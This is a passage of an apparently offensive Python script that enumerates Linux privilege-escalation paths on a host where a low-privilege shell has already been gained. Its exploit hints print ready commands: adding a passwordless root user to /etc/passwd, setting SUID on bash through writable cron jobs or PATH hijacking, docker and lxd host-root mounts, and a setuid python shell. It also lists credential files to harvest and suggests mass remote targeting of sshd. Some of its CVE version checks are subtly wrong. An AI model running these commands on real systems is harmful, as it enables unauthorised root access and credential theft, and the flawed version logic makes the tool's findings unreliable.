#!/usr/bin/env python3
"""
linux_lpe_checker.py — Linux 本地提权全向量检测（授权主机）

用途：在已获取低权限 shell 的主机上，系统性检查所有可用提权路径。

CVE 漏洞：
  - CVE-2026-64564  SCTPhantom  SCTP UAF → LPE + 容器逃逸  (CVSS 9.8)
  - CVE-2024-6387   regreSSHion  sshd RCE as root
  - CVE-2024-1086   nf_tables UAF → LPE  (广泛被利用)
  - CVE-2023-0386   OverlayFS SUID 提权  (容器内常见)
  - CVE-2022-0847   DirtyPipe 管道写覆盖  (5.8-5.16.x)
  - CVE-2021-3156   sudo Heap Buffer Overflow

本地配置错误：
  - SUID/SGID 危险二进制（GTFOBins 匹配）
  - sudo 无密码规则 (sudo -l)
  - sudo 版本 + 危险命令（ALL, /bin/bash, vim 等）
  - Cron 任务 + 可写脚本 / run-parts 目录
  - PATH 劫持（当前用户 PATH + /etc/crontab PATH；分辨 symlink 777 假象）
  - root 包装脚本 / mysqld_safe（脚本或 MySQL 目录可写）
  - 宝塔 default.db 可读 + 本机 MySQL 弱口（不 dump）
  - Linux Capabilities（cap_setuid 等）
  - Docker socket 暴露（容器逃逸）
  - K8s ServiceAccount token（切 K8s特权Pod手法，建 Pod 先问）
  - /etc/passwd /etc/shadow 可写
  - LD_PRELOAD / LD_LIBRARY_PATH 可滥用
  - NFS no_root_squash
  - 敏感文件（私钥、密码文件）可读
  - 当前用户所属高权限组（docker/lxd/disk/adm）
  - Python/Ruby/Perl 可提权 env 变量

用法：
  python3 炼蛊房/linux_lpe_checker.py              # 全部检查（CVE + 本地）
  python3 炼蛊房/linux_lpe_checker.py --cve-only   # 只检查 CVE
  python3 炼蛊房/linux_lpe_checker.py --local-only # 只检查本地配置
  python3 炼蛊房/linux_lpe_checker.py --json       # JSON 输出
  python3 炼蛊房/linux_lpe_checker.py --json > /tmp/lpe_$(hostname).json
"""

import argparse
import json
import os
import platform
import re
import shutil
import subprocess
from pathlib import Path


# ──────────────────────────── 工具函数 ──────────────────────────────

def _run(cmd: list[str], timeout: int = 5) -> str:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return (r.stdout + r.stderr).strip()
    except Exception:
        return ""


def _kernel_version() -> tuple[int, int, int]:
    """返回 (major, minor, patch)"""
    rel = platform.release()
    m = re.search(r"(\d+)\.(\d+)\.(\d+)", rel)
    if m:
        return int(m.group(1)), int(m.group(2)), int(m.group(3))
    return (0, 0, 0)


def _kernel_str() -> str:
    return platform.release()


def _in_container() -> bool:
    if Path("/.dockerenv").exists() or Path("/run/.containerenv").exists():
        return True
    cgroup = Path("/proc/1/cgroup")
    if cgroup.is_file():
        try:
            t = cgroup.read_text(errors="replace")
            if any(x in t for x in ("docker", "kubepods", "containerd", "lxc", "podman")):
                return True
        except Exception:
            pass
    return False


def _sctp_module_loaded() -> bool:
    lsmod = _run(["lsmod"])
    return "sctp" in lsmod.lower()


def _sctp_addip_enabled() -> bool:
    val = _run(["sysctl", "-n", "net.sctp.addip_enable"])
    return val.strip() == "1"


def _get_sudo_version() -> str | None:
    out = _run(["sudo", "--version"])
    m = re.search(r"Sudo version (\S+)", out)
    return m.group(1) if m else None


def _get_sshd_version() -> str | None:
    out = _run(["sshd", "-V"]) or _run(["ssh", "-V"])
    m = re.search(r"OpenSSH_(\d+\.\d+[p\d]*)", out)
    return m.group(1) if m else None


def _overlayfs_userns() -> bool:
    """检查是否可以在用户命名空间内挂载 overlayfs"""
    val = _run(["sysctl", "-n", "kernel.unprivileged_userns_clone"])
    return val.strip() == "1"


def _nftables_available() -> bool:
    return shutil.which("nft") is not None


def _dir_write_info(d: str) -> dict:
    """os.access 跟随符号链接。lrwxrwxrwx 的 /bin 不等于可写。"""
    p = Path(d)
    info = {
        "path": d,
        "exists": False,
        "is_symlink": False,
        "writable": False,
        "note": "",
    }
    try:
        info["is_symlink"] = p.is_symlink()
        info["exists"] = p.exists()
    except Exception:
        return info
    if info["is_symlink"]:
        try:
            info["link_mode"] = oct(p.lstat().st_mode)[-3:]
            tgt = os.path.realpath(d)
            info["target"] = tgt
            if Path(tgt).exists():
                info["target_mode"] = oct(Path(tgt).stat().st_mode)[-3:]
            info["note"] = (
                f"{d} -> {tgt} 链接模式 {info.get('link_mode')} "
                f"（lrwxrwxrwx=777 是假象）；目标 {info.get('target_mode', '?')}"
            )
        except Exception:
            pass
    elif info["exists"]:
        try:
            info["mode"] = oct(p.stat().st_mode)[-3:]
        except Exception:
            pass
    if info["exists"]:
        info["writable"] = os.access(d, os.W_OK)
        if info["is_symlink"]:
            info["note"] += "；目标可写 → PATH 劫持成立" if info["writable"] else "；目标不可写，不能当 777 用"
    return info


def _cron_path_dirs() -> list:
    dirs = []
    files = [Path("/etc/crontab")]
    cron_d = Path("/etc/cron.d")
    if cron_d.is_dir():
        try:
            files.extend(p for p in cron_d.iterdir() if p.is_file())
        except Exception:
            pass
    for f in files:
        try:
            for line in f.read_text(errors="ignore").splitlines():
                if line.startswith("PATH="):
                    dirs.extend(x for x in line.split("=", 1)[1].strip().split(":") if x)
        except Exception:
            pass
    return dirs


# ──────────────────────────── 各漏洞检查 ────────────────────────────

def check_cve_2026_64564() -> dict:
    """SCTPhantom: Linux SCTP ASCONF UAF → LPE + 容器逃逸"""
    maj, minor, patch = _kernel_version()
    kver = _kernel_str()
    in_ctn = _in_container()
    sctp_loaded = _sctp_module_loaded()

    # 受影响版本：< 6.6.148 / < 6.12.101 / < 6.18.42 / < 7.1.6
    vulnerable = False
    reason = ""

    if maj < 6:
        vulnerable = True
        reason = f"内核 {kver} < 6.6.148，受影响"
    elif maj == 6:
        if minor < 6:
            vulnerable = True
            reason = f"内核 {kver} 分支 6.x (< 6.6)，受影响"
        elif minor == 6 and patch < 148:
            vulnerable = True
            reason = f"内核 {kver} < 6.6.148，受影响"
        elif minor < 12:
            vulnerable = True
            reason = f"内核 {kver} 分支 6.{minor}，未覆盖修复分支"
        elif minor == 12 and patch < 101:
            vulnerable = True
            reason = f"内核 {kver} < 6.12.101，受影响"
        elif minor < 18:
            vulnerable = True
            reason = f"内核 {kver} 分支 6.{minor}，未覆盖修复分支"
        elif minor == 18 and patch < 42:
            vulnerable = True
            reason = f"内核 {kver} < 6.18.42，受影响"
        else:
            reason = f"内核 {kver} 已修复"
    elif maj == 7:
        if minor == 1 and patch < 6:
            vulnerable = True
            reason = f"内核 {kver} < 7.1.6，受影响"
        else:
            reason = f"内核 {kver} 已修复"
    else:
        reason = f"内核 {kver} 未知版本，需手动确认"

    extra = []
    if sctp_loaded:
        extra.append("SCTP 模块已加载 ✓ 可触发")
    else:
        extra.append("SCTP 模块未加载（需 modprobe sctp 或有 CAP_SYS_MODULE）")
    if in_ctn:
        extra.append("当前在容器内 → 可尝试容器逃逸到宿主机 root")

    return {
        "cve": "CVE-2026-64564",
        "name": "SCTPhantom - Linux SCTP UAF",
        "type": "LPE + 容器逃逸",
        "cvss": 9.8,
        "vulnerable": vulnerable,
        "reason": reason,
        "extra": extra,
        "exploit_hint": (
            "触发条件：低权限本地用户 + SCTP 可用。\n"
            "利用链：DEL-IP ASCONF 序列 → UAF → pg_vec 重占 → 内核读取原语 → "
            "KASLR 恢复 → commit_creds(root)。\n"
            "容器逃逸：SCTP_ASCONF_SUPPORTED socket option 无需 CAP_NET_ADMIN。\n"
            "缓解：rmmod sctp 或 echo 'install sctp /bin/true' >> /etc/modprobe.d/blacklist.conf"
        ) if vulnerable else "",
    }


def check_cve_2024_6387() -> dict:
    """regreSSHion: OpenSSH sshd signal handler race condition → 未认证 RCE as root"""
    ver = _get_sshd_version()

    def _parse_openssh_ver(s: str) -> tuple[int, int, int]:
        m = re.match(r"(\d+)\.(\d+)p?(\d*)", s or "")
        if m:
            return int(m.group(1)), int(m.group(2)), int(m.group(3) or "0")
        return (0, 0, 0)

    if not ver:
        return {
            "cve": "CVE-2024-6387",
            "name": "regreSSHion - OpenSSH sshd RCE",
            "type": "未认证 RCE (需要时间暴力竞争)",
            "cvss": 8.1,
            "vulnerable": None,
            "reason": "无法获取 sshd 版本，需手动检查",
            "extra": [],
            "exploit_hint": "",
        }

    maj, minor, patch = _parse_openssh_ver(ver)
    # 受影响：8.5p1 - 9.7p1（不含 9.8p1）
    vulnerable = False
    reason = ""
    if (maj, minor) >= (8, 5) and (maj, minor) < (9, 8):
        vulnerable = True
        reason = f"OpenSSH {ver} 在受影响范围 8.5p1-9.7p1"
    elif (maj, minor) >= (9, 8):
        reason = f"OpenSSH {ver} >= 9.8p1，已修复"
    else:
        reason = f"OpenSSH {ver} < 8.5p1，不受此 CVE 影响（但可能有其他洞）"

    return {
        "cve": "CVE-2024-6387",
        "name": "regreSSHion - OpenSSH sshd RCE",
        "type": "未认证 RCE (需要时间暴力竞争)",
        "cvss": 8.1,
        "vulnerable": vulnerable,
        "reason": reason,
        "extra": [f"当前 sshd 版本: OpenSSH_{ver}"],
        "exploit_hint": (
            "利用极其困难（竞争条件，glibc ASLR，需要数小时多次连接）。\n"
            "glibc 系统受影响；musl libc（如 Alpine）通常不受影响。\n"
            "探测工具：shodan/censys 筛 ssh banner + 版本即可远程探测大批量目标。"
        ) if vulnerable else "",
    }


def check_cve_2024_1086() -> dict:
    """nf_tables UAF → LPE（2024年被大量利用）"""
    maj, minor, patch = _kernel_version()
    kver = _kernel_str()

    # 受影响：3.15 - 6.8（修复在 6.3.13 / 6.4.1）
    # 更精确：5.14 < v < 6.4.1 / 6.3.x < 6.3.13
    vulnerable = False
    reason = ""
    if maj < 5 or (maj == 5 and minor < 14):
        reason = f"内核 {kver} < 5.14，nf_tables 版本较旧，可能不受此变体影响"
    elif (maj, minor) < (6, 4):
        vulnerable = True
        reason = f"内核 {kver} < 6.4.1，受 nf_tables UAF 影响（CVE-2024-1086 系列）"
    elif (maj, minor) == (6, 3) and patch < 13:
        vulnerable = True
        reason = f"内核 {kver} < 6.3.13，受影响"
    else:
        reason = f"内核 {kver} 通常已修复"

    nft = _nftables_available()
    unprivuserns = _overlayfs_userns()

    return {
        "cve": "CVE-2024-1086",
        "name": "nf_tables UAF → LPE",
        "type": "本地提权（无需 root，需要 nftables 访问）",
        "cvss": 7.8,
        "vulnerable": vulnerable,
        "reason": reason,
        "extra": [
            f"nft 命令可用: {'是' if nft else '否'}",
            f"unprivileged_userns_clone: {'启用' if unprivuserns else '未启用或未知'}",
        ],
        "exploit_hint": (
            "公开 PoC 可用（GitHub: notselwyn/CVE-2024-1086）。\n"
            "需要 nftables 权限（通常低权限用户有）或 unprivileged userns。\n"
            "利用 net/netfilter/nf_tables_api.c 中的 UAF，可稳定提权。"
        ) if vulnerable else "",
    }


def check_cve_2023_0386() -> dict:
    """OverlayFS SUID 提权（容器内高价值）"""
    maj, minor, patch = _kernel_version()
    kver = _kernel_str()
    in_ctn = _in_container()

    # 受影响：< 6.2
    vulnerable = False
    reason = ""
    if (maj, minor) < (6, 2):
        vulnerable = True
        reason = f"内核 {kver} < 6.2，受 OverlayFS SUID 提权影响"
    else:
        reason = f"内核 {kver} >= 6.2，已修复"

    unprivuserns = _overlayfs_userns()

    return {
        "cve": "CVE-2023-0386",
        "name": "OverlayFS SUID 提权",
        "type": "本地提权（容器内提权到 root，需要 FUSE/overlayfs 权限）",
        "cvss": 7.8,
        "vulnerable": vulnerable,
        "reason": reason,
        "extra": [
            f"在容器内: {'是' if in_ctn else '否'}",
            f"unprivileged_userns_clone: {'启用' if unprivuserns else '未启用'}",
        ],
        "exploit_hint": (
            "在容器内复制 SUID 文件到 overlayfs 挂载点，宿主机会将其视为 owned by root。\n"
            "需要 unprivileged user namespaces 支持。\n"
            "常见于 Ubuntu 22.04 默认配置的容器环境。"
        ) if vulnerable else "",
    }


def check_cve_2022_0847() -> dict:
    """DirtyPipe: 管道写覆盖只读文件"""
    maj, minor, patch = _kernel_version()
    kver = _kernel_str()

    # 受影响：5.8 - 5.16.11 / 5.15.25 / 5.10.102
    vulnerable = False
    reason = ""
    if (maj, minor) == (5, 8) or (maj == 5 and 8 <= minor <= 15):
        if minor == 16 and patch > 11:
            reason = f"内核 {kver} 5.16.x > 5.16.11，已修复"
        elif minor == 15 and patch > 25:
            reason = f"内核 {kver} 5.15.x > 5.15.25，已修复"
        elif minor == 10 and patch > 102:
            reason = f"内核 {kver} 5.10.x > 5.10.102，已修复"
        else:
            vulnerable = True
            reason = f"内核 {kver} 在 DirtyPipe 受影响范围（5.8-5.16.11）"
    elif maj < 5 or (maj == 5 and minor < 8):
        reason = f"内核 {kver} < 5.8，pipe splice 机制不同，不受此 CVE 影响"
    else:
        reason = f"内核 {kver} >= 5.17，已修复"

    return {
        "cve": "CVE-2022-0847",
        "name": "DirtyPipe - 管道写覆盖",
        "type": "本地提权（覆盖 /etc/passwd 或 SUID 文件）",
        "cvss": 7.8,
        "vulnerable": vulnerable,
        "reason": reason,
        "extra": [],
        "exploit_hint": (
            "利用方式：通过管道写覆盖任意只读文件（如 /etc/passwd、/etc/shadow）。\n"
            "最简方式：覆盖 /etc/passwd 添加无密码 root 用户，或覆盖 SUID 二进制。\n"
            "公开 PoC 极多，可靠度高。"
        ) if vulnerable else "",
    }


def check_cve_2021_3156() -> dict:
    """sudo Heap BOF"""
    ver = _get_sudo_version()
    if not ver:
        return {
            "cve": "CVE-2021-3156",
            "name": "sudo Heap BOF (Baron Samedit)",
            "type": "本地提权",
            "cvss": 7.8,
            "vulnerable": None,
            "reason": "无法获取 sudo 版本",
            "extra": [],
            "exploit_hint": "",
        }

    def _parse_sudo_ver(s: str) -> tuple[int, int, int]:
        m = re.match(r"(\d+)\.(\d+)\.?(\d*)", s)
        if m:
            return int(m.group(1)), int(m.group(2)), int(m.group(3) or "0")
        return (0, 0, 0)

    maj, minor, patch = _parse_sudo_ver(ver)
    # 受影响：< 1.9.5p2 / 1.8.32 / 1.8.31p2 / 1.9.0-1.9.5p1
    vulnerable = False
    reason = ""
    if (maj, minor) < (1, 8) or ((maj, minor) == (1, 8) and patch < 32):
        vulnerable = True
        reason = f"sudo {ver} 在受影响范围"
    elif (maj, minor) == (1, 9) and patch < 5:
        vulnerable = True
        reason = f"sudo {ver} < 1.9.5p2，受影响"
    else:
        reason = f"sudo {ver} 已修复"

    return {
        "cve": "CVE-2021-3156",
        "name": "sudo Heap BOF (Baron Samedit)",
        "type": "本地提权",
        "cvss": 7.8,
        "vulnerable": vulnerable,
        "reason": reason,
        "extra": [f"当前 sudo 版本: {ver}"],
        "exploit_hint": (
            "CVE-2021-3156 利用 sudoedit -s 参数的堆溢出提权到 root。\n"
            "公开 PoC 可用，但利用成功率依赖 glibc 版本和内存布局。"
        ) if vulnerable else "",
    }


# ──────────────────────────── 本地提权向量检测 ─────────────────────

# GTFOBins: SUID 可提权的二进制列表
GTFOBINS_SUID = {
    "bash", "sh", "ash", "dash", "zsh", "ksh",
    "python", "python2", "python3", "python3.8", "python3.9", "python3.10",
    "perl", "ruby", "lua", "node", "nodejs",
    "vim", "vi", "nano", "less", "more", "man",
    "find", "awk", "gawk", "nawk", "mawk",
    "env", "tee", "cp", "mv", "install",
    "wget", "curl", "nc", "ncat", "netcat",
    "strace", "gdb", "ltrace",
    "make", "gcc", "cc",
    "git", "svn",
    "php", "php5", "php7", "php8",
    "docker", "runc",
    "pkexec", "newgrp", "su", "sudo",
    "ping", "ping6",
    "at", "cron", "crontab",
    "nmap",
    "openssl",
    "tar", "zip", "gzip", "bzip2", "xz",
    "base32", "base64",
    "rsync", "scp",
    "ssh", "ssh-keygen",
    "mount", "umount",
    "chown", "chmod",
    "dd", "od", "xxd",
    "journalctl", "systemctl",
    "ftp", "tftp",
    "aria2c",
    "taskset",
    "ionice",
    "exiftool",
    "socat",
    "screen", "tmux",
    "busybox",
    "setenv", "runscript",
    "sqlite3", "mysql", "psql",
}

# 危险 sudo 命令（可直接提权）
SUDO_DANGEROUS = {
    "ALL", "/bin/bash", "/bin/sh", "/bin/zsh", "/bin/ash",
    "python", "python2", "python3",
    "perl", "ruby", "lua", "node",
    "vim", "vi", "nano", "less", "more", "man",
    "find", "awk", "env", "tee",
    "wget", "curl",
    "nc", "ncat", "netcat", "socat",
    "docker", "runc", "lxc",
    "php", "cp", "mv", "install",
    "nmap",
    "openssl",
    "tar", "zip", "gzip",
    "base64", "base32",
    "rsync",
    "mount", "umount",
    "dd",
    "chown", "chmod",
    "systemctl",
    "journalctl",
    "screen", "tmux",
    "sqlite3",
    "git", "svn",
    "ssh",
    "ftp",
    "strace", "gdb",
}

# 高权限组
PRIVILEGED_GROUPS = {
    "root", "sudo", "wheel", "admin",
    "docker", "lxd", "lxc",
    "disk", "adm", "shadow",
    "video",           # 某些发行版可读 /dev/fb
    "systemd-journal",
    "kmem",            # 可读 /dev/kmem
    "kvm",
}


def check_suid_sgid() -> dict:
    """枚举 SUID/SGID 二进制，匹配 GTFOBins"""
    hits = []
    try:
        out = _run(["find", "/", "-perm", "-4000", "-o", "-perm", "-2000",
                    "-type", "f"], timeout=20)
        for line in out.splitlines():
            line = line.strip()
            if not line:
                continue
            name = Path(line).name.split(".")[0].lower()
            if name in GTFOBINS_SUID:
                hits.append(line)
    except Exception:
        pass

    return {
        "cve": "LOCAL-SUID",
        "name": "SUID/SGID GTFOBins 二进制",
        "type": "本地提权（直接执行提权命令）",
        "cvss": 7.8,
        "vulnerable": bool(hits),
        "reason": f"发现 {len(hits)} 个危险 SUID 二进制" if hits else "未发现危险 SUID 二进制",
        "extra": hits[:15],
        "exploit_hint": "\n".join([
            f"  {b}  → GTFOBins: https://gtfobins.github.io/gtfobins/{Path(b).name.split('.')[0]}/#suid"
            for b in hits[:5]
        ]) if hits else "",
    }


def check_sudo_rules() -> dict:
    """检查 sudo -l 无密码规则"""
    out = _run(["sudo", "-l", "-n"])  # -n: 非交互，无密码规则才会输出
    hits = []
    nopasswd_cmds = []

    if "NOPASSWD" in out:
        for line in out.splitlines():
            if "NOPASSWD" in line:
                hits.append(line.strip())
                # 提取命令名
                for cmd in SUDO_DANGEROUS:
                    if cmd.lower() in line.lower():
                        nopasswd_cmds.append((line.strip(), cmd))

    # 检查 ALL
    is_all = any("ALL" in h and "NOPASSWD" in h for h in hits)

    return {
        "cve": "LOCAL-SUDO",
        "name": "sudo NOPASSWD 规则",
        "type": "本地提权（无需密码执行特权命令）",
        "cvss": 8.8,
        "vulnerable": bool(hits),
        "reason": ("★ 发现 NOPASSWD ALL（完全提权）" if is_all
                   else f"发现 {len(hits)} 条 NOPASSWD 规则" if hits
                   else "无 NOPASSWD 规则"),
        "extra": hits[:10],
        "exploit_hint": "\n".join([
            f"  {cmd}  → 可直接 sudo {cmd} 提权"
            for _, cmd in nopasswd_cmds[:3]
        ]) + ("\n  sudo -s 或 sudo bash → 直接 root shell" if is_all else "") if hits else "",
    }


def check_cron_writable() -> dict:
    """检查 cron 任务中可写的脚本 / run-parts 目录"""
    cron_files = []
    cron_dirs = [
        "/etc/crontab", "/etc/cron.d/", "/etc/cron.daily/",
        "/etc/cron.hourly/", "/etc/cron.weekly/", "/etc/cron.monthly/",
        "/var/spool/cron/crontabs/",
    ]

    script_hits = []

    for d in ("/etc/cron.hourly", "/etc/cron.daily", "/etc/cron.weekly", "/etc/cron.monthly"):
        if Path(d).exists() and os.access(d, os.W_OK):
            script_hits.append(f"cron-dir-writable:{d}")

    for cron_path in cron_dirs:
        p = Path(cron_path)
        if p.is_file():
            cron_files.append(p)
        elif p.is_dir():
            try:
                cron_files.extend(p.iterdir())
            except Exception:
                pass

    for cf in cron_files:
        try:
            content = cf.read_text(errors="ignore")
            for m in re.finditer(r'(/[^\s#\|;]+\.(?:sh|py|pl|rb))', content):
                script_path = Path(m.group(1))
                if script_path.exists() and os.access(str(script_path), os.W_OK):
                    script_hits.append(str(script_path))
                parent = script_path.parent
                if parent.exists() and os.access(str(parent), os.W_OK):
                    script_hits.append(f"{script_path} (父目录可写: {parent})")
            for m in re.finditer(r"run-parts(?:\s+--\S+)*\s+(\S+)", content):
                d = m.group(1).strip()
                if d.startswith("/") and Path(d).exists() and os.access(d, os.W_OK):
                    script_hits.append(f"run-parts-writable:{d}")
        except Exception:
            pass

    return {
        "cve": "LOCAL-CRON",
        "name": "Cron 任务可写脚本",
        "type": "本地提权（修改 root cron 脚本 / run-parts 目录）",
        "cvss": 7.0,
        "vulnerable": bool(script_hits),
        "reason": f"发现 {len(script_hits)} 个可写 cron 落点" if script_hits else "无可写 cron 脚本/目录",
        "extra": script_hits[:10],
        "exploit_hint": ("在可写脚本或 cron.hourly 目录放入 root 执行文件：\n"
                         "  echo 'chmod +s /bin/bash' >> " + (script_hits[0] if script_hits else "/etc/cron.hourly/x")) if script_hits else "",
    }


def check_path_writable() -> dict:
    """PATH 劫持：当前用户 PATH + root crontab PATH。分辨 /bin 符号链接 777 假象。"""
    user_dirs = [d for d in os.environ.get("PATH", "").split(":") if d]
    cron_dirs = _cron_path_dirs()
    seen = []
    for d in user_dirs + cron_dirs + ["/bin", "/sbin", "/usr/bin", "/usr/sbin"]:
        if d not in seen:
            seen.append(d)

    writable = []
    extra = []
    for d in seen:
        info = _dir_write_info(d)
        src = "crontab-PATH" if d in cron_dirs else ("user-PATH" if d in user_dirs else "common")
        if info.get("is_symlink") and info.get("note"):
            extra.append(f"[{src}] {info['note']}")
        if info["writable"]:
            writable.append(d)
            extra.append(f"[{src}] WRITABLE {d}")

    return {
        "cve": "LOCAL-PATH",
        "name": "PATH 可写目录（命令劫持）",
        "type": "本地提权（伪造高频命令等待 root cron/调用）",
        "cvss": 6.7,
        "vulnerable": bool(writable),
        "reason": (
            f"可写 {len(writable)} 个 PATH 目录" if writable
            else "PATH/crontab PATH 目标目录不可写（若 ls 见 /bin 777，多半是 symlink 假象）"
        ),
        "extra": extra[:12] or (["crontab PATH 未声明"] if not cron_dirs else []),
        "exploit_hint": (
            "将恶意命令放入可写 PATH 目录（优先 crontab PATH 里更靠前的）：\n"
            f"  echo '#!/bin/bash\\nchmod +s /bin/bash' > {writable[0]}/run-parts\n"
            f"  chmod +x {writable[0]}/run-parts\n"
            "  等 root cron 调无绝对路径的命令。写盘/SUID 先问。"
        ) if writable else "",
    }


def check_capabilities() -> dict:
    """检查危险 Linux Capabilities"""
    dangerous_caps = {
        "cap_setuid": "可直接设置 UID 为 0（root）",
        "cap_setgid": "可直接设置 GID 为 0",
        "cap_sys_admin": "类似 root，可挂载文件系统、修改内核参数",
        "cap_dac_override": "忽略 DAC 权限检查（读写任意文件）",
        "cap_dac_read_search": "忽略文件读/目录搜索权限",
        "cap_net_raw": "可创建 RAW socket（网络嗅探）",
        "cap_sys_ptrace": "可 ptrace 任意进程（含 root）",
        "cap_sys_module": "可加载内核模块（→ rootkit）",
        "cap_chown": "可任意 chown 文件",
        "cap_fowner": "忽略所有者权限检查",
        "cap_net_bind_service": "可绑定 < 1024 端口",
        "cap_sys_chroot": "可 chroot",
    }

    hits = []
    out = _run(["getcap", "-r", "/"], timeout=15)
    if not out:
        out = _run(["find", "/usr", "/bin", "/sbin", "/opt",
                    "-exec", "getcap", "{}", ";"], timeout=15)

    for line in out.splitlines():
        line = line.strip()
        if not line or "failed" in line.lower():
            continue
        for cap, desc in dangerous_caps.items():
            if cap in line.lower() and "+ep" in line.lower():
                hits.append(f"{line}  ({desc})")

    return {
        "cve": "LOCAL-CAP",
        "name": "危险 Linux Capabilities",
        "type": "本地提权（利用 cap_setuid/sys_admin 等）",
        "cvss": 7.8,
        "vulnerable": bool(hits),
        "reason": f"发现 {len(hits)} 个危险 capability" if hits else "无危险 capability",
        "extra": hits[:10],
        "exploit_hint": ("典型利用（cap_setuid+ep on python）：\n"
                         "  python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'") if hits else "",
    }


def check_docker_socket() -> dict:
    """检查 Docker socket 是否可访问（容器逃逸或宿主机提权）"""
    docker_sock = Path("/var/run/docker.sock")
    accessible = False
    note = ""

    if docker_sock.exists():
        if os.access(str(docker_sock), os.W_OK):
            accessible = True
            note = "Docker socket 可写 → 可创建特权容器逃逸/提权"
        elif os.access(str(docker_sock), os.R_OK):
            accessible = True
            note = "Docker socket 可读"

    in_docker_group = "docker" in _run(["id"])
    if in_docker_group:
        accessible = True
        note = "当前用户在 docker 组 → docker run 可提权"

    return {
        "cve": "LOCAL-DOCKER",
        "name": "Docker socket 可访问",
        "type": "本地提权 / 容器逃逸",
        "cvss": 8.8,
        "vulnerable": accessible,
        "reason": note if accessible else "Docker socket 不可访问",
        "extra": [],
        "exploit_hint": ("挂载宿主机根目录到容器，修改 /etc/passwd 或添加 ssh key：\n"
                         "  docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n"
                         "  # 或添加 root 用户：\n"
                         "  docker run -v /etc:/etc --rm -it alpine sh -c "
                         "'echo root2::0:0:root:/root:/bin/sh >> /etc/passwd'") if accessible else "",
    }


def check_k8s_sa() -> dict:
    """检测 K8s ServiceAccount（只读指纹；建特权 Pod 走独立手法卡且先问）。"""
    sa_dir = Path("/var/run/secrets/kubernetes.io/serviceaccount")
    token = sa_dir / "token"
    ns_file = sa_dir / "namespace"
    extra: list[str] = []
    present = token.exists()
    if present:
        extra.append("token-present")
        if ns_file.exists():
            try:
                extra.append("ns=" + ns_file.read_text(encoding="utf-8").strip()[:64])
            except Exception:
                extra.append("ns=unreadable")
        try:
            extra.append(f"token_bytes={token.stat().st_size}")
        except Exception:
            pass
        extra.append("playbook=传承/群瓮·特权.md")
    kube = os.environ.get("KUBERNETES_SERVICE_HOST") or os.environ.get("KUBERNETES_PORT")
    if kube:
        extra.append("env-kube-api")
        present = True
    return {
        "cve": "LOCAL-K8S-SA",
        "name": "K8s ServiceAccount token",
        "type": "容器逃逸 / 集群控制面（只读探测）",
        "cvss": 8.8,
        "vulnerable": present,
        "reason": "发现 SA token 或 KUBERNETES_* 环境" if present else "无 K8s SA",
        "extra": extra[:8],
        "exploit_hint": (
            "先读 Secret/ConfigMap（L2）；create pods 再请示 L3。\n"
            "  真源：传承/群瓮·特权.md\n"
            "  不要在本检测器里起 privileged Pod"
        ) if present else "",
    }


def check_writable_passwd() -> dict:
    """检查 /etc/passwd /etc/shadow 是否可写"""
    hits = []
    for f in ["/etc/passwd", "/etc/shadow", "/etc/sudoers"]:
        if Path(f).exists() and os.access(f, os.W_OK):
            hits.append(f)

    return {
        "cve": "LOCAL-PASSWD",
        "name": "/etc/passwd 或 /etc/shadow 可写",
        "type": "本地提权（直接写入 root 用户）",
        "cvss": 9.8,
        "vulnerable": bool(hits),
        "reason": f"可写: {hits}" if hits else "关键认证文件不可写",
        "extra": hits,
        "exploit_hint": ("直接写入无密码 root 账户：\n"
                         "  echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd\n"
                         "  su hacker") if "/etc/passwd" in hits else "",
    }


def check_privileged_groups() -> dict:
    """检查当前用户是否在高权限组"""
    id_out = _run(["id"])
    groups_out = _run(["groups"])
    user_groups = set(re.findall(r'\b(\w+)\b', id_out + " " + groups_out))
    dangerous = user_groups & PRIVILEGED_GROUPS - {"root"}  # root 本来就是 root

    hits = []
    exploit_hints = []
    for g in dangerous:
        if g == "docker":
            hits.append("docker 组 → docker run 挂载宿主机根目录提权")
            exploit_hints.append("docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
        elif g == "lxd" or g == "lxc":
            hits.append(f"{g} 组 → lxc/lxd 容器挂载磁盘提权")
            exploit_hints.append("lxc init ubuntu:18.04 privesc -c security.privileged=true && lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true && lxc start privesc && lxc exec privesc /bin/sh")
        elif g == "disk":
            hits.append("disk 组 → 直接读写磁盘设备（/dev/sda）")
            exploit_hints.append("debugfs /dev/sda1  # 直接读取文件系统，无视权限")
        elif g == "adm":
            hits.append("adm 组 → 可读所有系统日志（含密码/token）")
        elif g == "shadow":
            hits.append("shadow 组 → 可读 /etc/shadow（hash 破解）")
            exploit_hints.append("cat /etc/shadow | grep root")
        elif g == "sudo" or g == "wheel":
            hits.append(f"{g} 组 → 通常可 sudo（需密码）")
        elif g == "systemd-journal":
            hits.append("systemd-journal 组 → 可读所有日志（含 env 密钥）")

    return {
        "cve": "LOCAL-GROUPS",
        "name": "高权限用户组成员",
        "type": "本地提权（利用组权限）",
        "cvss": 7.8,
        "vulnerable": bool(hits),
        "reason": f"在高权限组: {list(dangerous)}" if hits else "无高权限组",
        "extra": hits,
        "exploit_hint": "\n".join(exploit_hints[:3]) if exploit_hints else "",
    }


def check_sensitive_files() -> dict:
    """检查敏感文件可读性（SSH 私钥、密码文件等）"""
    targets = [
        "/root/.ssh/id_rsa", "/root/.ssh/id_ecdsa", "/root/.ssh/id_ed25519",
        "/root/.bash_history", "/root/.mysql_history",
        "/home/*/.ssh/id_rsa", "/home/*/.ssh/id_ecdsa",
        "/etc/mysql/my.cnf", "/etc/mysql/debian.cnf",
        "/www/server/mysql/my.cnf",
        "/www/server/panel/data/admin_path.pl",
        "/etc/nginx/.htpasswd", "/etc/apache2/.htpasswd",
        "/var/www/html/wp-config.php",
        "/var/www/html/.env",
        "/.env",
        "/app/.env", "/srv/.env", "/opt/.env",
        "/proc/1/environ",  # init 进程环境变量（含密钥）
        "/opt/teamcity/data/config/database.properties",
        "/opt/atlassian/confluence/confluence/WEB-INF/confluence.cfg.xml",
    ]

    readable = []
    for pattern in targets:
        if "*" in pattern:
            import glob
            for f in glob.glob(pattern):
                if os.access(f, os.R_OK):
                    readable.append(f)
        else:
            if Path(pattern).exists() and os.access(pattern, os.R_OK):
                readable.append(pattern)

    return {
        "cve": "LOCAL-SENSITIVE",
        "name": "敏感文件可读",
        "type": "凭据收割（SSH 私钥 / 数据库密码 / 环境变量密钥）",
        "cvss": 6.5,
        "vulnerable": bool(readable),
